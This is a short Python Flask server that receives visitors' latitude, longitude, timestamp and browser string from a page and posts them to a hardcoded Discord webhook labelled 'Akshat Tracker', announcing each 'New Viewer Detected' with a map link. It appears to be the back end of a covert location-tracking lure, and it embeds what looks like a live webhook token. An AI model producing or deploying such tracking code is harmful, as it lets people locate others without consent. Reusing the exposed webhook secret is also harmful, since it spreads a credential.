from flask import Flask, request, send_from_directory, jsonify
import requests
from datetime import datetime
import os

app = Flask(__name__)

os.makedirs('static', exist_ok=True)

# Your Discord Webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1521185686709862623/IT5aYe_AA002gG5AwQ6Qrg_8ctPm-Q87gr6vhLtajqkoTP_rxi_Tn5U9I0I-JHRRYyTu"

@app.route('/')
def index():
    return open('index.html', 'r').read()

@app.route('/capture-location', methods=['POST'])
def capture_location():
    data = request.json
    lat = data.get('latitude')
    lon = data.get('longitude')
    timestamp = data.get('timestamp')
    
    location_info = f"""
**🔔 New Viewer Detected!**

**Time:** {timestamp}
**Latitude:** {lat}
**Longitude:** {lon}

**📍 Google Maps:** https://www.google.com/maps?q={lat},{lon}

**Browser:** {data.get('userAgent')}
"""

    try:
        payload = {
            "content": location_info,
            "username": "Akshat Tracker",
            "avatar_url": "https://i.imgur.com/0jAV3.png"
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        print("✅ Location sent to Discord")
    except Exception as e:
        print("❌ Discord error:", e)

    return jsonify({"status": "ok"})

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
